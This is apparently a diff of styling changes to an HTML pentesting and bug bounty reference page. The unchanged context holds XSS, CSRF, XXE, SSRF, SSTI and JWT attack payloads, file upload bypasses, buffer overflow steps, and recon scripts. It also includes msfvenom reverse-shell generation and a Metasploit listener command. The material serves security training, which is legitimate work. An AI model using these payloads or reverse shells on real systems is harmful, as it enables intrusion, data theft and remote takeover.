 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">Reflected XSS Payloads</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">Reflected XSS Payloads</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code>&lt;script&gt;alert(1)&lt;/script&gt;
+<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
 
 # Event handler based
 &lt;img src=x onerror=alert(1)&gt;
@@ -5535,7 +5536,7 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//</code></pre>
 </div>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">DOM-Based XSS</span>
 </div>
@@ -5557,9 +5558,9 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//</code></pre>
 
 <h4 class="h4">DOM XSS Testing</h4>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">DOM XSS Test Payloads</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">DOM XSS Test Payloads</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># Test via URL fragment (#)
+<pre><code># Test via URL fragment (#)
 https://example.com/page#&lt;img src=x onerror=alert(1)&gt;
 
 # Test via URL parameter
@@ -5579,7 +5580,7 @@ dalfox url "https://example.com/page?q=test" --blind your-callback-url</code></p
 </div>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">CSP Bypass Techniques</span>
 </div>
@@ -5587,9 +5588,9 @@ dalfox url "https://example.com/page?q=test" --blind your-callback-url</code></p
 <p>Content Security Policy restricts which resources a page can load. Bypassing CSP is essential for XSS exploitation.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">CSP Bypass Methods</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">CSP Bypass Methods</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># Common weak CSP patterns and bypasses
+<pre><code># Common weak CSP patterns and bypasses
 
 # 1. 'unsafe-inline' - any inline script works
 Content-Security-Policy: script-src 'self' 'unsafe-inline'
@@ -5626,9 +5627,9 @@ https://redirects.example.com/redirect?url=https://evil.com
 <p>CSRF tricks an authenticated user into performing an unwanted action. The browser automatically includes session cookies.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">CSRF Attack Examples</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">CSRF Attack Examples</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># Basic CSRF - auto-submit form
+<pre><code># Basic CSRF - auto-submit form
 &lt;html&gt;
 &lt;body onload="document.getElementById('csrf-form').submit()"&gt;
   &lt;form id="csrf-form" action="https://bank.example.com/transfer" method="POST"&gt;
@@ -5663,9 +5664,9 @@ https://redirects.example.com/redirect?url=https://evil.com
 <p>XXE exploits vulnerable XML parsers to read files, perform SSRF, or cause DoS.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">XXE Payloads</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">XXE Payloads</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># Basic XXE - read file
+<pre><code># Basic XXE - read file
 &lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;!DOCTYPE foo [
   &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
@@ -5709,9 +5710,9 @@ https://redirects.example.com/redirect?url=https://evil.com
 <p>SSRF tricks the server into making requests to internal resources or arbitrary external hosts.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">SSRF Exploitation</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">SSRF Exploitation</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># Basic SSRF - access internal resources
+<pre><code># Basic SSRF - access internal resources
 https://example.com/fetch?url=http://127.0.0.1/admin
 
 # AWS metadata endpoint (IMDSv1)
@@ -5749,9 +5750,9 @@ http://127.0.0.1         -> http://[::1]            (IPv6)</code></pre>
 
 <h2 class="h2">File Upload Bypass Techniques</h2>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">File Upload Bypass Methods</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">File Upload Bypass Methods</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># 1. Extension bypass
+<pre><code># 1. Extension bypass
 shell.php -> shell.pHp, shell.php5, shell.php7, shell.phar
 shell.php -> shell.php.jpg (null byte in some parsers)
 shell.php -> shell.php%00.jpg (URL-encoded null byte)
@@ -5793,9 +5794,9 @@ mv image.jpg shell.php.jpg
 <p>SSTI occurs when user input is embedded in server-side templates without proper sanitization. Impact ranges from information disclosure to Remote Code Execution (RCE).</p>
 
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">SSTI Detection &amp; Exploitation</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">SSTI Detection &amp; Exploitation</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># Detection payloads (mathematical expressions)
+<pre><code># Detection payloads (mathematical expressions)
 {{7*7}}          -> 49 (Jinja2, Twig, Pebble)
 ${7*7}           -> 49 (Freemarker, Velocity)
 #{7*7}           -> 49 (Thymeleaf)
@@ -5825,9 +5826,9 @@ tplmap -u "https://example.com/page?name=test"</code></pre>
 
 <h2 class="h2">JWT (JSON Web Token) Attacks</h2>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">JWT Attack Techniques</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">JWT Attack Techniques</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># JWT Structure: Header.Payload.Signature
+<pre><code># JWT Structure: Header.Payload.Signature
 # eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.signature
 
 # --- Algorithm Confusion ---
@@ -5868,7 +5869,7 @@ python3 jwt_tool.py TOKEN -X a                  # All attacks
 <p>Buffer overflows occur when a program writes data beyond the bounds of allocated memory. They allow attackers to overwrite return addresses and execute arbitrary code.</p>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">Stack-Based Buffer Overflow Mechanics</span>
 </div>
@@ -5887,9 +5888,9 @@ python3 jwt_tool.py TOKEN -X a                  # All attacks
 
 <h4 class="h4">Exploitation Steps</h4>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">Buffer Overflow Exploitation Workflow</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">Buffer Overflow Exploitation Workflow</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># Step 1: Find the overflow
+<pre><code># Step 1: Find the overflow
 python3 -c "print('A'*100)" | ./vulnerable_program
 python3 -c "print('A'*200)" | ./vulnerable_program
 python3 -c "print('A'*300)" | ./vulnerable_program
@@ -5936,7 +5937,7 @@ sys.stdout.buffer.write(payload)
 </div>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">Exploitation Tools Overview</span>
 </div>
@@ -6048,7 +6049,7 @@ Bug bounty programs allow independent security researchers to test companies' ap
 <h2 class="h2">Getting Started &amp; Building Reputation</h2>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">Your First 90 Days Roadmap</span>
 </div>
@@ -6086,15 +6087,15 @@ Quality over quantity. One well-written, impactful finding is worth more than 50
 <h2 class="h2">Bug Bounty Methodology</h2>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">Program Reconnaissance &amp; Asset Mapping</span>
 </div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">Asset Discovery Workflow</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">Asset Discovery Workflow</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># 1. Read the program scope carefully
+<pre><code># 1. Read the program scope carefully
 # - Which domains are in scope?
 # - What is excluded?
 # - What bounty ranges for which severity?
@@ -6131,7 +6132,7 @@ cat live_subs.txt | cut -d' ' -f1 | gowitness file -f -</code></pre>
 </div>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">Finding Hidden Assets</span>
 </div>
@@ -6139,9 +6140,9 @@ cat live_subs.txt | cut -d' ' -f1 | gowitness file -f -</code></pre>
 <p>The best bugs are often on assets that aren't in the main scope but are still accessible and controlled by the target.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">Hidden Asset Discovery</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">Hidden Asset Discovery</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># 1. JavaScript file analysis
+<pre><code># 1. JavaScript file analysis
 # JS files often contain API endpoints, secrets, internal paths
 katana -u https://app.target.com -jc -d 2 | grep -E "\.js$" > js_files.txt
 
@@ -6192,7 +6193,7 @@ curl -s https://target.com/sitemap.xml | xmllint --format - 2>/dev/null</code></
 <h2 class="h2">High-Value Bug Classes</h2>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">Business Logic Testing</span>
 </div>
@@ -6215,7 +6216,7 @@ curl -s https://target.com/sitemap.xml | xmllint --format - 2>/dev/null</code></
 </div>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">Race Condition Hunting</span>
 </div>
@@ -6223,9 +6224,9 @@ curl -s https://target.com/sitemap.xml | xmllint --format - 2>/dev/null</code></
 <p>Race conditions occur when the outcome of operations depends on the timing and ordering of events. In web apps, this often means performing the same action multiple times before the first completes.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">Race Condition Exploitation</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">Race Condition Exploitation</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># Using Burp Suite Turbo Intruder
+<pre><code># Using Burp Suite Turbo Intruder
 # 1. Right-click request -> Extensions -> Turbo Intruder
 # 2. Use race.py template
 # 3. Send multiple requests simultaneously
@@ -6268,7 +6269,7 @@ for t in threads: t.join()
 </div>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">IDOR / AOR Exploitation</span>
 </div>
@@ -6276,9 +6277,9 @@ for t in threads: t.join()
 <p>Insecure Direct Object Reference (IDOR) / Broken Object Level Authorization (BOLA) occurs when an application exposes internal object references without proper authorization checks.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">IDOR Testing Techniques</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">IDOR Testing Techniques</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># Basic IDOR - change ID in URL
+<pre><code># Basic IDOR - change ID in URL
 # Your profile: https://target.com/api/users/12345/profile
 # Try: https://target.com/api/users/12346/profile
 
@@ -6320,7 +6321,7 @@ PUT /api/admin/users  -> 200
 </div>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">Mass Assignment Vulnerabilities</span>
 </div>
@@ -6328,9 +6329,9 @@ PUT /api/admin/users  -> 200
 <p>Mass assignment occurs when a framework automatically binds request parameters to internal objects, allowing attackers to modify fields they shouldn't have access to.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">Mass Assignment Testing</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">Mass Assignment Testing</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># Normal profile update request
+<pre><code># Normal profile update request
 PUT /api/v1/user/profile
 {
   "name": "John",
@@ -6386,7 +6387,7 @@ POST /api/user/update
 <div class="sdiv"></div>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">Account Takeover Chains</span>
 </div>
@@ -6394,9 +6395,9 @@ POST /api/user/update
 <p>Account takeover (ATO) chains combine multiple low/medium severity issues into a critical finding.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">Account Takeover Attack Vectors</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">Account Takeover Attack Vectors</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># 1. Password reset flow flaws
+<pre><code># 1. Password reset flow flaws
 # - Token in URL (leakable via Referer header)
 # - Predictable reset tokens (sequential, timestamp-based)
 # - No rate limiting on reset code verification
@@ -6438,7 +6439,7 @@ Host: evil.com
 </div>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">Subdomain Takeover</span>
 </div>
@@ -6446,9 +6447,9 @@ Host: evil.com
 <p>Subdomain takeover occurs when a subdomain points to a third-party service (AWS S3, Heroku, GitHub Pages) that is no longer in use. An attacker can claim the resource and serve content on the target's subdomain.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">Subdomain Takeover Workflow</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">Subdomain Takeover Workflow</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># 1. Find subdomains with dangling CNAME records
+<pre><code># 1. Find subdomains with dangling CNAME records
 subfinder -d target.com -silent > subs.txt
 cat subs.txt | dnsx -cname -silent | grep -v "target.com\|cloudflare\|akamai"
 
@@ -6493,7 +6494,7 @@ nuclei -u target.com -t takeovers/
 </div>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">API Security Testing</span>
 </div>
@@ -6501,9 +6502,9 @@ nuclei -u target.com -t takeovers/
 <p>APIs are the modern attack surface. REST, GraphQL, and gRPC all have unique vulnerability patterns.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">API Security Testing Checklist</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">API Security Testing Checklist</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># REST API Testing
+<pre><code># REST API Testing
 # 1. Enumerate endpoints
 # Check Swagger/OpenAPI docs
 curl https://target.com/api/swagger.json
@@ -6569,9 +6570,9 @@ curl -X POST https://target.com/graphql \
 
 <h3 class="h3">Essential Recon Pipeline</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">Automated Recon Script</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">Automated Recon Script</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code>#!/bin/bash
+<pre><code>#!/bin/bash
 TARGET=$1
 mkdir -p recon/$TARGET
 
@@ -6610,7 +6611,7 @@ echo "[+] Results in recon/$TARGET/"</code></pre>
 <h2 class="h2">Writing Accepted Reports</h2>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">Report Structure &amp; Tips</span>
 </div>
@@ -6644,7 +6645,7 @@ echo "[+] Results in recon/$TARGET/"</code></pre>
 </div>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">Common Duplicates &amp; Informational Findings</span>
 </div>
@@ -6672,7 +6673,7 @@ echo "[+] Results in recon/$TARGET/"</code></pre>
 <h2 class="h2">Real Bug Bounty Case Studies</h2>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">Case Study: $30K Account Takeover Chain</span>
 </div>
@@ -6683,9 +6684,9 @@ Three medium-severity issues chained together resulted in a critical account tak
 </div>
 
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">The Attack Chain</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">The Attack Chain</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># Step 1: Find password reset token via Host header injection
+<pre><code># Step 1: Find password reset token via Host header injection
 # POST /api/forgot-password
 # Host: evil.com
 # Content-Type: application/json
@@ -6722,15 +6723,15 @@ Three medium-severity issues chained together resulted in a critical account tak
 </div>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">Case Study: $15K GraphQL IDOR</span>
 </div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">GraphQL Deep IDOR</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">GraphQL Deep IDOR</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># 1. Enabled introspection query - found entire API schema
+<pre><code># 1. Enabled introspection query - found entire API schema
 # 2. Found user profile query with nested objects
 # 3. Regular query returns limited fields for other users
 # 4. But nested objects (addresses, payment_methods) had NO authorization
@@ -6761,15 +6762,15 @@ query GetUser {
 </div>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">Case Study: $8K Race Condition</span>
 </div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">Double-Redeem Race Condition</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">Double-Redeem Race Condition</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># Target: Gift card redemption endpoint
+<pre><code># Target: Gift card redemption endpoint
 # POST /api/giftcard/redeem
 # {"code":"GIFT-CARD-CODE-HERE"}
 
@@ -6877,8 +6878,8 @@ This is a living reference. Each tool includes installation, core usage, advance
 <div class="col-b">
 <h3>Installation</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Install</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>sudo apt install nmap -y
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Install</span></div>
+<div class="tbox-b"><pre><code>sudo apt install nmap -y
 git clone https://github.com/nmap/nmap.git &amp;&amp; cd nmap
 ./configure &amp;&amp; make &amp;&amp; sudo make install</code></pre></div>
 </div>
@@ -6897,16 +6898,16 @@ git clone https://github.com/nmap/nmap.git &amp;&amp; cd nmap
 </table>
 <h3>Service &amp; OS Detection</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Detection</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>nmap -sV --version-intensity 5 target
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Detection</span></div>
+<div class="tbox-b"><pre><code>nmap -sV --version-intensity 5 target
 nmap -A target
 nmap -O --osscan-guess target
 nmap -sV -sC -O --traceroute target</code></pre></div>
 </div>
 <h3>NSE Scripts</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">NSE Scripts</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>nmap -sC target
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">NSE Scripts</span></div>
+<div class="tbox-b"><pre><code>nmap -sC target
 nmap --script vuln target
 nmap --script auth target
 nmap --script brute target
@@ -6930,8 +6931,8 @@ nmap --script http-form-brute --script-args http-form-brute.path=/login target</
 <tr><td><code>-T5</code></td><td>Insane</td><td>Extremely fast, may miss ports</td></tr>
 </table>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Tuning</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>nmap --min-rate 1000 --max-rate 5000 target
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Tuning</span></div>
+<div class="tbox-b"><pre><code>nmap --min-rate 1000 --max-rate 5000 target
 nmap --min-parallelism 100 target
 nmap --max-retries 2 --host-timeout 300s target
 nmap -p- target
@@ -6939,8 +6940,8 @@ nmap --top-ports 1000 target</code></pre></div>
 </div>
 <h3>Output Formats</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Output</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>nmap -oA scan_results target
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Output</span></div>
+<div class="tbox-b"><pre><code>nmap -oA scan_results target
 nmap -oN scan.txt target
 nmap -oX scan.xml target
 nmap -oG scan.grep target
@@ -6948,8 +6949,8 @@ db_import scan.xml</code></pre></div>
 </div>
 <h3>Real-World Profiles</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Profiles</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>nmap -sS -T4 -p- --min-rate 1000 -oA initial target
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Profiles</span></div>
+<div class="tbox-b"><pre><code>nmap -sS -T4 -p- --min-rate 1000 -oA initial target
 nmap -sS -sV -sC -O -p- -T3 --script vuln -oA full target
 nmap -sS -T1 -f --data-length 16 -D RND:10 target
 nmap -sV -p 80,443,8080,8443 --script "http-*" target
@@ -6965,14 +6966,14 @@ Always run <code>nmap -sS -T4 -p- --min-rate 1000</code> first for quick discove
 <div class="col-b">
 <h3>Installation</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Install</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>sudo apt install metasploit-framework -y
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Install</span></div>
+<div class="tbox-b"><pre><code>sudo apt install metasploit-framework -y
 msfdb init</code></pre></div>
 </div>
 <h3>msfvenom &#8212; Payload Generation</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">msfvenom</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>msfvenom -l payloads
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">msfvenom</span></div>
+<div class="tbox-b"><pre><code>msfvenom -l payloads
 msfvenom -l formats
 
 # Linux reverse shell
@@ -6999,8 +7000,8 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -e x86/shikata
 </div>
 <h3>Console Workflow</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">msfconsole</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>msfconsole
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">msfconsole</span></div>
+<div class="tbox-b"><pre><code>msfconsole
 hosts / services / vulns
 workspace -a new_ws
 search eternalblue
@@ -7028,8 +7029,8 @@ sessions -l / sessions -i 1 / sessions -u 1</code></pre></div>
 </table>
 <h3>Resource Scripts</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Automation</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>msfconsole -r exploit.rc
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Automation</span></div>
+<div class="tbox-b"><pre><code>msfconsole -r exploit.rc
 
 # Quick handler
 msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit"</code></pre></div>
@@ -7071,8 +7072,8 @@ msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter
 <div class="col-b">
 <h3>Capture Filters (BPF)</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Capture Filters</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>host 10.10.10.10
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Capture Filters</span></div>
+<div class="tbox-b"><pre><code>host 10.10.10.10
 src host 10.10.14.5
 port 80
 portrange 1-1024
@@ -7082,8 +7083,8 @@ net 10.10.10.0/24</code></pre></div>
 </div>
 <h3>Display Filters</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Display Filters</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>http.request.method == "POST"
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Display Filters</span></div>
+<div class="tbox-b"><pre><code>http.request.method == "POST"
 http.response.code == 200
 http.host == "target.com"
 http.request.uri contains "admin"
@@ -7095,8 +7096,8 @@ tcp.stream eq 5</code></pre></div>
 </div>
 <h3>tshark CLI</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">tshark</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>sudo tshark -i eth0 -w capture.pcap
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">tshark</span></div>
+<div class="tbox-b"><pre><code>sudo tshark -i eth0 -w capture.pcap
 tshark -r capture.pcap -Y "http.request.method == POST"
 tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri
 tshark -r capture.pcap --export-objects http,exported_files</code></pre></div>
@@ -7108,8 +7109,8 @@ tshark -r capture.pcap --export-objects http,exported_files</code></pre></div>
 <div class="col-h"><span class="ci">&#9654;</span><span class="ct">SQLMap &#8212; SQL Injection</span></div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">SQLMap</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>sqlmap -u "http://target.com/page?id=1" --batch
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">SQLMap</span></div>
+<div class="tbox-b"><pre><code>sqlmap -u "http://target.com/page?id=1" --batch
 sqlmap -u "http://target.com/login" --data="username=admin&amp;password=test" --batch
 sqlmap -r request.txt --batch
 sqlmap -u "http://target.com/page?id=1" --dbs --batch
